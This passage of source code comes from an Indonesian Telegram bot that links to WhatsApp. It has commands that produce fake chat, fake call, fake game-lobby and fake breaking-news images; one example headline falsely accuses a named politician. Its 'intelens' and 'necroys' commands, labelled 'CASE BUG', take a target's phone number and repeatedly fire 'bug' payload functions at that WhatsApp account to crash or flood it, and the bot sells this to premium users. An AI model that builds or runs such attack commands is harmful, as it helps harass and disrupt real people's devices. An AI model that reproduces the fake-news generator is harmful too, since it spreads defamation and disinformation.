    const quoteText = textInput.trim();

    if (!quoteText) {
        return ctx.reply('Format salah!\nGunakan: /iqc [teks]\n\nContoh:\n/iqc Jangan lupa upgrade ke VIP Empire!');
    }

    await ctx.reply('Sedang membuat iPhone Quote Chat, mohon tunggu...');

    try {
        const apiUrl = `https://api.azbry.com/api/maker/iqc?text=${encodeURIComponent(quoteText)}`;
       
        // Download ke Buffer
        const response = await axios.get(apiUrl, { responseType: 'arraybuffer' });
        const buffer = Buffer.from(response.data, 'utf-8');

        await ctx.replyWithPhoto({ source: buffer }, {
            caption: 'Sukses Generate iPhone Quote Chat!',
            parse_mode: 'Markdown',
            reply_to_message_id: ctx.message.message_id
        });
    } catch (error) {
        console.error(error);
        ctx.reply('Terjadi kesalahan saat memproses gambar ke API.');
    }
});


bot.command('igc', async (ctx) => {
    const textInput = ctx.message.text.split(' ').slice(1).join(' ');

    if (!textInput) {
        return ctx.reply('Format salah!\nGunakan: /igc link_foto | nama grup | jumlah peserta\n\nContoh:\n/igc https://example.com/pp.jpg | Xylent Empire | 2,500 Peserta');
    }

    const [urlProfil, namaGroup, jumlahPeserta] = textInput.split('|');
    
    if (!urlProfil || !namaGroup || !jumlahPeserta) {
        return ctx.reply('Semua kolom harus diisi! Pastikan gunakan tanda pembatas | dengan benar.');
    }
    
    const linkProfil = urlProfil.trim();
    if (!linkProfil.startsWith('http://') && !linkProfil.startsWith('https://')) {
        return ctx.reply('Parameter pertama harus berupa link URL foto profil yang valid (diawali http/https)!');
    }

    await ctx.reply('Sedang Proses tampilan iPhone Group Chat, mohon tunggu...');

    try {
        const apiUrl = `https://api.azbry.com/api/maker/igc?url=${encodeURIComponent(linkProfil)}&name=${encodeURIComponent(namaGroup.trim())}&member=${encodeURIComponent(jumlahPeserta.trim())}`;
        
        // Download ke Buffer
        const response = await axios.get(apiUrl, { responseType: 'arraybuffer' });
        const buffer = Buffer.from(response.data, 'utf-8');

        await ctx.replyWithPhoto({ source: buffer }, {
            caption: `Sukses Generate iPhone Group Chat\nGroup: ${namaGroup.trim()}`,
            parse_mode: 'Markdown',
            reply_to_message_id: ctx.message.message_id
        });
    } catch (error) {
        console.error(error);
        ctx.reply('Terjadi kesalahan saat memproses data ke API.');
    }
});

bot.command('music', async (ctx) => {
    const textInput = ctx.message.text.split(' ').slice(1).join(' ');

    if (!textInput) {
        return ctx.reply('Format salah!\nGunakan: /music link_thumbnail | judul lagu\n\nContoh:\n/music https://example.com/cover.jpg | Cyberpunk 2026 Soundtrack');
    }

    const [imgUrl, musicName] = textInput.split('|');

    if (!imgUrl || !musicName) {
        return ctx.reply('Kedua kolom harus diisi! Pastikan gunakan pembatas | dengan benar.');
    }

    const cleanImgUrl = imgUrl.trim();

    if (!cleanImgUrl.startsWith('http://') && !cleanImgUrl.startsWith('https://')) {
        return ctx.reply('Parameter pertama harus berupa link URL thumbnail gambar yang valid (diawali http/https)!');
    }

    await ctx.reply('Sedang Proses tampilan Music Player, mohon tunggu...');

    try {
        const apiUrl = `https://api.azbry.com/api/maker/music?img=${encodeURIComponent(cleanImgUrl)}&name=${encodeURIComponent(musicName.trim())}`;
        
        // Download ke Buffer
        const response = await axios.get(apiUrl, { responseType: 'arraybuffer' });
        const buffer = Buffer.from(response.data, 'utf-8');

        await ctx.replyWithPhoto({ source: buffer }, {
            caption: `Sukses Generate Music Player!\n🎵 Lagu: ${musicName.trim()}`,
            parse_mode: 'Markdown',
            reply_to_message_id: ctx.message.message_id
        });
    } catch (error) {
        console.error(error);
        ctx.reply('Terjadi kesalahan saat memproses gambar ke API.');
    }
});


bot.command('tanyaustadz', async (ctx) => {
    const textInput = ctx.message.text.split(' ').slice(1).join(' ');
    const ustadzQuery = textInput.trim();

    if (!ustadzQuery) {
        return ctx.reply('Format salah!\nGunakan: /tanyaustadz [pertanyaan]\n\nContoh:\n/tanyaustadz Ustadz, bagaimana hukumnya memakai script orang lain?');
    }

    await ctx.reply('Sedang Proses Tanya Ustadz, mohon tunggu...');

    try {
        const apiUrl = `https://api.azbry.com/api/maker/tanyaustadz?text=${encodeURIComponent(ustadzQuery)}`;
        
        // Download ke Buffer
        const response = await axios.get(apiUrl, { responseType: 'arraybuffer' });
        const buffer = Buffer.from(response.data, 'utf-8');

        await ctx.replyWithPhoto({ source: buffer }, {
            caption: 'Sukses Generate Mockup Tanya Ustadz',
            parse_mode: 'Markdown',
            reply_to_message_id: ctx.message.message_id
        });
    } catch (error) {
        console.error(error);
        ctx.reply('Terjadi kesalahan saat memproses gambar ke API.');
    }
});


bot.command('threads', async (ctx) => {
    const textInput = ctx.message.text.split(' ').slice(1).join(' ');

    if (!textInput) {
        return ctx.reply('Format salah!\nGunakan urutan sesuai dokumentasi API:\n/threads nama | username | link_prof | isi_post | waktu\n\nContoh lengkap:\n/threads xyzen | xyzenofficial | https://link.com/pic.jpg | Halo Dunia | 5m');
    }

    const parts = textInput.split('|').map(p => p.trim());
    
    const name = parts[0];
    const username = parts[1];
    const pfp = parts[2];
    const textChat = parts[3];
    const waktu = parts[4];   

    if (!name || !textChat) {
        return ctx.reply('Gagal! Parameter Nama (ke-1) dan Isi Post (ke-4) wajib diisi.\n\nFormat: nama | username | link_pfp | isi_post | waktu');
    }

    await ctx.reply('Sedang Proses render tampilan Threads Post, mohon tunggu...');

    try {
        let apiUrl = `https://api.azbry.com/api/maker/threadspost?name=${encodeURIComponent(name)}&text=${encodeURIComponent(textChat)}`;
        
        if (username) apiUrl += `&username=${encodeURIComponent(username)}`;
        if (pfp) apiUrl += `&pfp=${encodeURIComponent(pfp)}`;
        if (waktu) apiUrl += `&waktu=${encodeURIComponent(waktu)}`;
        
        // Download ke Buffer
        const response = await axios.get(apiUrl, { responseType: 'arraybuffer' });
        const buffer = Buffer.from(response.data, 'utf-8');

        await ctx.replyWithPhoto({ source: buffer }, {
            caption: `Sukses Create Threads Post!`,
            parse_mode: 'Markdown',
            reply_to_message_id: ctx.message.message_id
        });
    } catch (error) {
        console.error(error);
        ctx.reply('Terjadi kesalahan saat memproses data ke API.');
    }
});

bot.command('fakecall', async (ctx) => {
    const textInput = ctx.message.text.split(' ').slice(1).join(' ');

    if (!textInput) {
        return ctx.reply('Format salah!\nGunakan pembatas |\n/fakecall nama_penelepon | durasi_waktu | link_foto_profil\n\nContoh:\n/fakecall Ayank | 00:00 | https://c.top4top.io/p_3815w0ycy1.jpg');
    }

    const [name, time, ppUrl] = textInput.split('|').map(p => p.trim());

    if (!name || !time || !ppUrl) {
        return ctx.reply('Semua kolom (Nama, Waktu, dan Link PP) wajib diisi!');
    }

    if (!ppUrl.startsWith('http://') && !ppUrl.startsWith('https://')) {
        return ctx.reply('Parameter ketiga harus berupa link URL foto profil yang valid!');
    }

    await ctx.reply('Sedang Proses Generate tampilan panggilan palsu, mohon tunggu...');

    try {
        const apiUrl = `https://api.synoxcloud.xyz/canvas/fakecall?name=${encodeURIComponent(name)}&time=${encodeURIComponent(time)}&pp=${encodeURIComponent(ppUrl)}`;
        
        const response = await axios.get(apiUrl, { responseType: 'arraybuffer' });
        const buffer = Buffer.from(response.data, 'utf-8');

        await ctx.replyWithPhoto({ source: buffer }, {
            caption: `*Sukses Generate Fakecall!*`,
            parse_mode: 'Markdown',
            reply_to_message_id: ctx.message.message_id
        });
    } catch (error) {
        console.error(error);
        ctx.reply('Terjadi kesalahan saat memproses gambar fakecall ke API.');
    }
});

bot.command('idcard', async (ctx) => {
    const textInput = ctx.message.text.split(' ').slice(1).join(' ');

    if (!textInput) {
        return ctx.reply('Format salah!\nGunakan pembatas |\n/idcard nama | jabatan/title | nama_script | link_kontak\n\nContoh:\n/idcard Saurus | Creator | Api synox | https://t.me/lordsaurus');
    }

    const [name, title, script, contact] = textInput.split('|').map(p => p.trim());

    if (!name || !title || !script || !contact) {
        return ctx.reply('Semua kolom (Nama, Title, Script, dan Kontak) harus diisi lengkap!');
    }

    await ctx.reply('Sedang Proses Genarate  Developer ID Card Mohon Tunggu.');

    try {
        const apiUrl = `https://api.synoxcloud.xyz/canvas/idcard?name=${encodeURIComponent(name)}&title=${encodeURIComponent(title)}&script=${encodeURIComponent(script)}&contact=${encodeURIComponent(contact)}`;
        
        const response = await axios.get(apiUrl, { responseType: 'arraybuffer' });
        const buffer = Buffer.from(response.data, 'utf-8');

        await ctx.replyWithPhoto({ source: buffer }, {
            caption: ` *Sukses Generate Developer ID Card!*\n👤 Owner: *${name}*`,
            parse_mode: 'Markdown',
            reply_to_message_id: ctx.message.message_id
        });
    } catch (error) {
        console.error(error);
        ctx.reply('Terjadi kesalahan saat memproses Developer ID Card.');
    }
});

bot.command('spotifycard', async (ctx) => {
    const textInput = ctx.message.text.split(' ').slice(1).join(' ');

    if (!textInput) {
        return ctx.reply('Format salah!\nGunakan pembatas |\n/spotifycard judul_lagu | nama_artis | link_cover_album\n\nContoh:\n/spotifycard Bergema sampai selamanya | Nadhif Basalamah | https://c.top4top.io/p_3815mp2s21.jpg');
    }

    const [title, artist, coverUrl] = textInput.split('|').map(p => p.trim());

    if (!title || !artist || !coverUrl) {
        return ctx.reply('Semua kolom (Judul, Artis, dan Link Cover) wajib diisi!');
    }

    if (!coverUrl.startsWith('http://') && !coverUrl.startsWith('https://')) {
        return ctx.reply('Parameter ketiga harus berupa link URL cover album yang valid!');
    }

    await ctx.reply('Sedang membuat Spotify Now Playing card mohon tunggu...');

    try {
        const apiUrl = `https://api.synoxcloud.xyz/canvas/spotifycard?title=${encodeURIComponent(title)}&artist=${encodeURIComponent(artist)}&cover=${encodeURIComponent(coverUrl)}`;
        
        const response = await axios.get(apiUrl, { responseType: 'arraybuffer' });
        const buffer = Buffer.from(response.data, 'utf-8');

        await ctx.replyWithPhoto({ source: buffer }, {
            caption: `*Sukses Generate Spotify Card!*\n🎵 *${title}* — ${artist}`,
            parse_mode: 'Markdown',
            reply_to_message_id: ctx.message.message_id
        });
    } catch (error) {
        console.error(error);
        ctx.reply('Terjadi kesalahan saat mengambil data gambar Spotify dari API.');
    }
});

bot.command('ttqc', async (ctx) => {
    const textInput = ctx.message.text.split(' ').slice(1).join(' ');

    if (!textInput) {
        return ctx.reply('Format salah!\nGunakan pembatas |\n/ttqc username | teks_chat | link_avatar\n\nContoh:\n/ttqc Saurus | Just friend kok cemburu😸 | https://c.top4top.io/p_3827ycihz1.jpg');
    }

    const [username, textChat, avatarUrl] = textInput.split('|').map(p => p.trim());

    if (!username || !textChat || !avatarUrl) {
        return ctx.reply('Semua kolom (Username, Teks Chat, dan Link Avatar) wajib diisi!');
    }

    if (!avatarUrl.startsWith('http://') && !avatarUrl.startsWith('https://')) {
        return ctx.reply('Parameter ketiga harus berupa link URL avatar yang valid!');
    }

    await ctx.reply('Sedang Proses Generate TikTok Quote Chat Mohon Tunggu');

    try {
        const apiUrl = `https://api.synoxcloud.xyz/canvas/ttqc?username=${encodeURIComponent(username)}&text=${encodeURIComponent(textChat)}&avatar=${encodeURIComponent(avatarUrl)}`;
        
        const response = await axios.get(apiUrl, { responseType: 'arraybuffer' });
        const buffer = Buffer.from(response.data, 'utf-8');

        await ctx.replyWithPhoto({ source: buffer }, {
            caption: `*Sukses Generate TikTok Quote Chat!*`,
            parse_mode: 'Markdown',
            reply_to_message_id: ctx.message.message_id
        });
    } catch (error) {
        console.error(error);
        ctx.reply('Terjadi kesalahan saat memproses data ke API Canvas TikTok.');
    }
});

bot.command('winquote', async (ctx) => {
    const textInput = ctx.message.text.split(' ').slice(1).join(' ');
    const quote = textInput.trim();

    if (!quote) {
        return ctx.reply('Format salah!\nGunakan: /winquote [teks]\n\nContoh:\n/winquote kenapa nyahh aku salah mulu');
    }

    await ctx.reply('Sedang Proses Generate Windows Media Player Quotes, mohon tunggu...');

    try {
        const apiUrl = `https://api-nanzz.my.id/docs/api/maker/windows-quotes.php?text=${encodeURIComponent(quote)}`;
        
        const response = await axios.get(apiUrl, { responseType: 'arraybuffer' });
        const buffer = Buffer.from(response.data, 'utf-8');

        await ctx.replyWithPhoto({ source: buffer }, {
            caption: 'Sukses Generate Windows Quotes!',
            parse_mode: 'Markdown',
            reply_to_message_id: ctx.message.message_id
        });
    } catch (error) {
        console.error(error);
        ctx.reply('Terjadi kesalahan saat mengambil data dari API.');
    }
});


bot.command('lobbyff', async (ctx) => {
    const textInput = ctx.message.text.split(' ').slice(1).join(' ');

    if (!textInput) {
        return ctx.reply('Format salah!\nGunakan: /lobbyff nickname | versi_background\n\nContoh:\n/lobbyff Nanas | 9');
    }

    const [nickname, versi] = textInput.split('|').map(p => p.trim());

    if (!nickname || !versi || isNaN(versi)) {
        return ctx.reply('Gagal! Nickname dan versi (harus angka) wajib diisi.\n\nFormat: /lobbyff nama | versi');
    }

    await ctx.reply('Sedang menyiapkan lobby Free Fire kamu, mohon tunggu...');

    try {
        const apiUrl = `https://api-nanzz.my.id/docs/api/maker/fake-lobby-ff.php?nickname=${encodeURIComponent(nickname)}&versi=${encodeURIComponent(versi)}`;
        
        const response = await axios.get(apiUrl, { responseType: 'arraybuffer' });
        const buffer = Buffer.from(response.data, 'utf-8');

        await ctx.replyWithPhoto({ source: buffer }, {
            caption: `Sukses Generate Fake Lobby FF\n👤 Nickname: *${nickname}*\n🖼️ Versi Background: *${versi}*`,
            parse_mode: 'Markdown',
            reply_to_message_id: ctx.message.message_id
        });
    } catch (error) {
        console.error(error);
        ctx.reply('Terjadi kesalahan. Pastikan pilihan versi latar belakang tersedia.');
    }
});

bot.command('lobbyml', async (ctx) => {
    const textInput = ctx.message.text.split(' ').slice(1).join(' ');

    if (!textInput) {
        return ctx.reply('Format salah!\nGunakan pembatas |\n/lobbyml username | link_avatar | rank | indeks_border\n\nContoh:\n/lobbyml Owiee | https://example.com/avatar.jpg | imo | 0\n\nPilihan Rank: epic, glory, gm, honor, imo, mawi, legend');
    }

    // Memecah parameter input
    const [username, avatarUrl, rank, border] = textInput.split('|').map(p => p.trim());

    // Validasi kelengkapan parameter
    if (!username || !avatarUrl || !rank || border === undefined || border === '') {
        return ctx.reply('Semua kolom (Username, Link Avatar, Rank, dan Border) wajib diisi!\nFormat: /lobbyml nama | link | rank | border');
    }

    // Validasi link avatar
    if (!avatarUrl.startsWith('http://') && !avatarUrl.startsWith('https://')) {
        return ctx.reply('Parameter kedua harus berupa link URL avatar gambar yang valid (diawali http/https)!');
    }

    // Validasi pilihan rank secara sederhana
    const validRanks = ['epic', 'glory', 'gm', 'honor', 'imo', 'mawi', 'legend'];
    if (!validRanks.includes(rank.toLowerCase())) {
        return ctx.reply(`Rank tidak valid! Pilih salah satu dari: ${validRanks.join(', ')}`);
    }

    await ctx.reply('Sedang Proses Generate Fake Lobby MLBB, mohon tunggu...');

    try {
        // Menyusun URL API sesuai struktur dokumentasi nanzzapi
        const apiUrl = `https://api-nanzz.my.id/docs/api/maker/fake-lobby-ml.php?username=${encodeURIComponent(username)}&avatar=${encodeURIComponent(avatarUrl)}&rank=${encodeURIComponent(rank.toLowerCase())}&border=${encodeURIComponent(border)}`;
        
        // Mengunduh hasil gambar sebagai buffer
        const response = await axios.get(apiUrl, { responseType: 'arraybuffer' });
        const buffer = Buffer.from(response.data, 'utf-8');

        // Mengirimkan ke Telegram
        await ctx.replyWithPhoto({ source: buffer }, {
            caption: `Sukses Generate Fake Lobby MLBB\n👤 Nickname: ${username}\n🏅 Rank: ${rank.toUpperCase()}\n🖼️ Border ID: *${border}*`,
            parse_mode: 'Markdown',
            reply_to_message_id: ctx.message.message_id
        });
    } catch (error) {
        console.error(error);
        ctx.reply('Terjadi kesalahan saat memproses gambar ke API. Pastikan semua parameter diisi dengan benar.');
    }
});

bot.command('storyig', async (ctx) => {
    const textInput = ctx.message.text.split(' ').slice(1).join(' ');

    if (!textInput) {
        return ctx.reply('Format salah!\nGunakan pembatas |\n/storyig nama_user | teks_story | link_gambar_background\n\nContoh:\n/storyig John Doe | Hello World | https://example.com/bg.jpg');
    }

    const [name, textStory, bgUrl] = textInput.split('|').map(p => p.trim());

    if (!name || !textStory || !bgUrl) {
        return ctx.reply('Semua kolom (Nama, Teks, dan Link Gambar) wajib diisi dengan benar!');
    }

    if (!bgUrl.startsWith('http://') && !bgUrl.startsWith('https://')) {
        return ctx.reply('Parameter ketiga harus berupa link URL background gambar yang valid!');
    }

    await ctx.reply('Sedang Proses Generate Instagram Story Mockup, mohon tunggu...');

    try {
        // Karena endpoint web bertipe POST file, kita kirim datanya via form-data / URL param jika API mendukung bypass url
        const apiUrl = `https://api-nanzz.my.id/docs/api/maker/fake-story-ig.php?name=${encodeURIComponent(name)}&text=${encodeURIComponent(textStory)}&url=${encodeURIComponent(bgUrl)}`;
        
        const response = await axios.get(apiUrl, { responseType: 'arraybuffer' });
        const buffer = Buffer.from(response.data, 'utf-8');

        await ctx.replyWithPhoto({ source: buffer }, {
            caption: `Sukses Generate Instagram Story!`,
            parse_mode: 'Markdown',
            reply_to_message_id: ctx.message.message_id
        });
    } catch (error) {
        console.error(error);
        ctx.reply('Terjadi kesalahan saat memproses mockup Instagram Story.');
    }
});

bot.command('berita', async (ctx) => {
    const textInput = ctx.message.text.split(' ').slice(1).join(' ');

    if (!textInput) {
        return ctx.reply('Format salah!\nGunakan pembatas |\n/berita judul_berita | link_gambar_berita\n\nContoh:\n/berita Viral! Jokowi mencuri 19jt lapangan pekerjaan | https://example.com/jokowi.webp');
    }

    const [judul, imgUrl] = textInput.split('|').map(p => p.trim());

    if (!judul || !imgUrl) {
        return ctx.reply('Kedua kolom (Judul Berita & Link Gambar) wajib diisi!');
    }

    if (!imgUrl.startsWith('http://') && !imgUrl.startsWith('https://')) {
        return ctx.reply('Parameter kedua harus berupa link URL gambar berita yang valid!');
    }

    await ctx.reply('Sedang Proses Generate iNews Breaking News, mohon tunggu...');

    try {
        const apiUrl = `https://api-nanzz.my.id/docs/api/maker/berita.php?text=${encodeURIComponent(judul)}&url=${encodeURIComponent(imgUrl)}`;
        
        const response = await axios.get(apiUrl, { responseType: 'arraybuffer' });
        const buffer = Buffer.from(response.data, 'utf-8');

        await ctx.replyWithPhoto({ source: buffer }, {
            caption: `Sukses Generate Fake Breaking News!\n📰 Berita: ${judul}`,
            parse_mode: 'Markdown',
            reply_to_message_id: ctx.message.message_id
        });
    } catch (error) {
        console.error(error);
        ctx.reply('Terjadi kesalahan saat memproses gambar ke API Berita.');
    }
});

bot.command('randompap', async (ctx) => {
    await ctx.reply('Sedang mencari gambar PAP acak, mohon tunggu...');

    try {
        const apiUrl = 'https://api-nanzz.my.id/docs/api/random/random-pap.php';
        
        const response = await axios.get(apiUrl, { responseType: 'arraybuffer' });
        const buffer = Buffer.from(response.data, 'utf-8');

        await ctx.replyWithPhoto({ source: buffer }, {
            caption: '*📸 Sukses Mengambil Random PAP!*',
            parse_mode: 'Markdown',
            reply_to_message_id: ctx.message.message_id
        });
    } catch (error) {
        console.error(error);
        ctx.reply('Terjadi kesalahan saat mengambil data gambar dari API. Coba lagi beberapa saat lagi.');
    }
});

bot.command("addadmin", checkOwner, (ctx) => {
  const args = ctx.message.text.split(" ");
  if (args.length < 2) {
    return ctx.reply("❌ Format Salah!. Example: /addadmin 12345678");
  }

  const userId = args[1];

  if (adminUsers.includes(userId)) {
    return ctx.reply(`✅ Pengguna ${userId} sudah memiliki status admin.`);
  }

  adminUsers.push(userId);
  saveJSON(adminFile, adminUsers);

  return ctx.reply(`✅ Pengguna ${userId} sekarang memiliki akses admin!`);
});

bot.command("addprem", checkOwner, checkAdmin, (ctx) => {
  const args = ctx.message.text.trim().split(" "); 

  if (args.length < 2) {
    return ctx.reply("❌ Format Salah!. Example : /addprem 12345678");
  }

  const userId = args[1].toString();

  if (premiumUsers.includes(userId)) {
    return ctx.reply(`✅ Pengguna ${userId} sudah memiliki akses premium.`);
  }

  premiumUsers.push(userId);
  saveJSON(premiumFile, premiumUsers);

  return ctx.reply(`✅ Pengguna ${userId} sekarang adalah premium.`);
});

bot.command("deladmin", checkOwner, (ctx) => {
  const args = ctx.message.text.split(" ");
  if (args.length < 2) {
    return ctx.reply("❌ Format Salah!. Example : /deladmin 12345678");
  }

  const userId = args[1];

  if (!adminUsers.includes(userId)) {
    return ctx.reply(`❌ Pengguna ${userId} tidak ada dalam daftar Admin.`);
  }

  adminUsers = adminUsers.filter((id) => id !== userId);
  saveJSON(adminFile, adminUsers);

  return ctx.reply(`🚫 Pengguna ${userId} telah dihapus dari daftar Admin.`);
});

bot.command("delprem", checkOwner, checkAdmin, (ctx) => {
  const args = ctx.message.text.trim().split(" ");

  if (args.length < 2) {
    return ctx.reply("❌ Format Salah!. Example : /delprem 12345678");
  }

  const userId = args[1].toString();

  if (!premiumUsers.includes(userId)) {
    return ctx.reply(`❌ Pengguna ${userId} tidak ada dalam daftar premium.`);
  }

  premiumUsers = premiumUsers.filter((id) => id !== userId);
  saveJSON(premiumFile, premiumUsers);

  return ctx.reply(`🚫 Pengguna ${userId} telah dihapus dari akses premium.`);
});

bot.command("cekprem", (ctx) => {
  const userId = ctx.from.id.toString();

  if (premiumUsers.includes(userId)) {
    return ctx.reply(`✅ Anda adalah pengguna premium.`);
  } else {
    return ctx.reply(`❌ Anda bukan pengguna premium.`);
  }
});

const vidthumbnail = "https://e.top4top.io/p_3835vr5d01.jpg";
bot.command("connect", async (ctx) => {
   if (ctx.from.id != OWNER_IDS) {
        return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
    }
    
  const args = ctx.message.text.split(" ")[1];
  if (!args) return ctx.reply("🪧 ☇ Format: /connect 62×××");

  const phoneNumber = args.replace(/[^0-9]/g, "");
  if (!phoneNumber) return ctx.reply("❌ ☇ Nomor tidak valid");

  try {
    if (!sock) return ctx.reply("❌ ☇ Socket belum siap, coba lagi nanti");
    if (sock.authState.creds.registered) {
      return ctx.reply(`✅ ☇ WhatsApp sudah terhubung dengan nomor: ${phoneNumber}`);
    }

    const code = await sock.requestPairingCode(phoneNumber, "Octavius");  
    const formattedCode = code?.match(/.{1,4}/g)?.join("-") || code;  

    const pairingMenu = `
<blockquote><pre>⬡═―—⊱ ⎧ OctaviusX  ⎭ ⊰―—═⬡</pre></blockquote>
⬡ Number: ${phoneNumber}
⬡ Pairing Code: ${formattedCode}
⬡ Status: Not Connected`;

    const sentMsg = await ctx.replyWithPhoto(vidthumbnail, {  
      caption: pairingMenu,  
      parse_mode: "HTML"  
    });  

    lastPairingMessage = {  
      chatId: ctx.chat.id,  
      messageId: sentMsg.message_id,  
      phoneNumber,  
      pairingCode: formattedCode
    };

  } catch (err) {
    console.error(err);
  }
});

if (sock) {
  sock.ev.on("connection.update", async (update) => {
    if (update.connection === "open" && lastPairingMessage) {
      const updateConnectionMenu = `
<blockquote><pre>⬡═―—⊱ ⎧ OctaviusX  ⎭ ⊰―—═⬡</pre></blockquote>
⬡ Number: ${lastPairingMessage.phoneNumber}
⬡ Pairing Code: ${lastPairingMessage.pairingCode}
⬡ Status: Connected`;

      try {  
        await bot.telegram.editMessageCaption(  
          lastPairingMessage.chatId,  
          lastPairingMessage.messageId,  
          undefined,  
          updateConnectionMenu,  
          { parse_mode: "HTML" }  
        );  
      } catch (e) {  
      }  
    }
  });
}

if (sock) {
  sock.ev.on("connection.update", async (update) => {
    if (update.connection === "open" && lastPairingMessage) {
      const updateConnectionMenu = `
<blockquote><pre>⬡═―—⊱ ⎧ OctaviusX  ⎭ ⊰―—═⬡</pre></blockquote>
⌑ Number: ${lastPairingMessage.phoneNumber}
⌑ Pairing Code: ${lastPairingMessage.pairingCode}
⌑ Status: Connected`;

      try {  
        await bot.telegram.editMessageCaption(  
          lastPairingMessage.chatId,  
          lastPairingMessage.messageId,  
          undefined,  
          updateConnectionMenu,  
          { parse_mode: "HTML" }  
        );  
      } catch (e) {  
      }  
    }
  });
}

bot.command("resetsession", async (ctx) => {
  if (ctx.from.id != OWNER_IDS) {
    return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
  }

  try {
    const sessionDirs = ["./session", "./sessions"];
    let deleted = false;

    for (const dir of sessionDirs) {
      if (fs.existsSync(dir)) {
        fs.rmSync(dir, { recursive: true, force: true });
        deleted = true;
      }
    }

    if (deleted) {
      await ctx.reply("✅ ☇ Session berhasil dihapus, panel akan restart");
      setTimeout(() => {
        process.exit(1);
      }, 2000);
    } else {
      ctx.reply("🪧 ☇ Tidak ada folder session yang ditemukan");
    }
  } catch (err) {
    console.error(err);
    ctx.reply("❌ ☇ Gagal menghapus session");
  }
});

bot.command("Status", checkOwner, checkAdmin, async (ctx) => {
  try {
    const waStatus = sock && sock.user
      ? "✅ Terhubung"
      : "❌ Tidak Terhubung";

    const message = `
<blockquote>
┏━━━━━━━━━━━━━━━━━━━━
┃ STATUS WHATSAPP
┣━━━━━━━━━━━━━━━━━━━━
┃ ⌬ STATUS : ${waStatus}
┗━━━━━━━━━━━━━━━━━━━━
</blockquote>
`;

    await ctx.reply(message, {
      parse_mode: "HTML"
    });

  } catch (error) {
    console.error("Gagal menampilkan status bot:", error);
    ctx.reply("❌ Gagal menampilkan status bot.");
  }
});

// CASE BUG RICH BY Xyzen AJG
bot.command("intelens", checkPremiumOrGroupPremium, checkWhatsAppConnection, async (ctx) => {
  const Icon_satus = HTML.customEmoji("5922612721244704425", "🔄")
  const Icon_ytta = HTML.customEmoji("5913787972200698358", "🤫")
  const Icon_andro = HTML.customEmoji("5316538972594274208", "🤖")
  const Icon_target = HTML.customEmoji("5253959125838090076", "🎯") 
  const Icon_ssc = HTML.customEmoji("5316827280863934685", "⚡")
  const q = ctx.message.text.split(" ")[1]; 
  if (!q) return ctx.reply("🪧 ☇ Example : /intelens 62xx");

  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

  // ============ DRAFT HANYA DI PV ============
  if (ctx.chat.type === 'private') {
    const DRAFT_ID = 99;
    await ctx.sendRichMessageDraft(
      DRAFT_ID,
      new HTML().thinking(HTML.italic(`⚙️ memproses target ${q}...`)).build()
    );
  }

  // ============ RICH MESSAGE TETAP DIKIRIM SEMUA CHAT ============
  const richContent = new HTML()
    .slideshow(`<img src="${PHOTOS[0]}"/>`)
    .heading(2, HTML.customEmoji("5897994140502724035", "🕷") + " OctaviusX  Vvip")
    .divider()
    .raw(`
      <table bordered striped>
        <tr><th>Detail</th><th>Informasi</th></tr>
        <tr><td>${Icon_target} Target</td><td>+${q.replace(/[^0-9]/g, "")}</td></tr>
        <tr><td>${Icon_satus} Status</td><td>Sucess Send Bugs ${Icon_ssc}</td></tr>
        <tr><td>${Icon_ytta} Type</td><td>Delay Bebas spam ${Icon_andro}</td></tr>
      </table>
    `)
    .divider()
    .taskList(
      { text: "Invisible Hard", checked: true },
      { text: "Bug Gacor", checked: true },
      { text: "Bebas Spam", checked: false },
      { text: "Anti Kenon 80%", checked: true }
    )
    .build();

  await ctx.sendRichMessage(richContent, {
    reply_markup: {
      inline_keyboard: [
        [{ text: `𝐂𝐞𝐤 𝐓𝐚𝐫𝐠𝐞𝐭`, url: `https://wa.me/${q.replace(/[^0-9]/g, "")}`, style: 'danger', icon_custom_emoji_id: "5116414868357907335"}]
      ]
    }
  });

  try {
    if (typeof sock === "undefined" || !sock) {
      throw new Error("Variabel 'sock' tidak ditemukan atau WhatsApp belum terhubung.");
    }
    
    for (let r = 0; r < 5; r++) {
      await scaryy(sock, target);
      await sendText2(sock, target);
      await elyndelayin(sock, target);
    }
  } catch (error) {
    return await ctx.sendRichMessage(
      new HTML()
        .heading(2, "❌ Gagal Mengirim")
        .paragraph(`Detail Error: <code>${error.message || error}</code>`)
        .build()
    );
  }
});


bot.command("necroys", checkPremiumOrGroupPremium, checkWhatsAppConnection, async (ctx) => {
  const Icon_satus = HTML.customEmoji("5922612721244704425", "🔄")
  const Icon_ytta = HTML.customEmoji("5913787972200698358", "🤫")
  const Icon_andro = HTML.customEmoji("5316538972594274208", "🤖")
  const Icon_target = HTML.customEmoji("5253959125838090076", "🎯") 
  const Icon_ssc = HTML.customEmoji("5316827280863934685", "⚡")
  const q = ctx.message.text.split(" ")[1]; 
  if (!q) return ctx.reply("🪧 ☇ Example : /intelens 62xx");

  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

  // ============ DRAFT HANYA DI PV ============
  if (ctx.chat.type === 'private') {
    const DRAFT_ID = 99;
    await ctx.sendRichMessageDraft(
      DRAFT_ID,
      new HTML().thinking(HTML.italic(`⚙️ memproses target ${q}...`)).build()
    );
  }

  // ============ RICH MESSAGE TETAP DIKIRIM SEMUA CHAT ============
  const richContent = new HTML()
    .slideshow(`<img src="${PHOTOS[0]}"/>`)
    .heading(2, HTML.customEmoji("5897994140502724035", "🕷") + " OctaviusX  Vvip")
    .divider()
    .raw(`
      <table bordered striped>
        <tr><th>Detail</th><th>Informasi</th></tr>
        <tr><td>${Icon_target} Target</td><td>+${q.replace(/[^0-9]/g, "")}</td></tr>
        <tr><td>${Icon_satus} Status</td><td>Sucess Send Bugs ${Icon_ssc}</td></tr>
        <tr><td>${Icon_ytta} Type</td><td>Delay Bebas spam ${Icon_andro}</td></tr>
      </table>
    `)
    .divider()
    .taskList(
      { text: "Invisible Hard", checked: true },
      { text: "Bug Gacor", checked: true },
      { text: "Bebas Spam", checked: false },
      { text: "Anti Kenon 80%", checked: true }
    )
    .build();

  await ctx.sendRichMessage(richContent, {
    reply_markup: {
      inline_keyboard: [
        [{ text: `𝐂𝐞𝐤 𝐓𝐚𝐫𝐠𝐞𝐭`, url: `https://wa.me/${q.replace(/[^0-9]/g, "")}`, style: 'danger', icon_custom_emoji_id: "5116414868357907335"}]
      ]
    }
  });

  try {
    if (typeof sock === "undefined" || !sock) {
      throw new Error("Variabel 'sock' tidak ditemukan atau WhatsApp belum terhubung.");
    }
    
    for (let r = 0; r < 5; r++) {
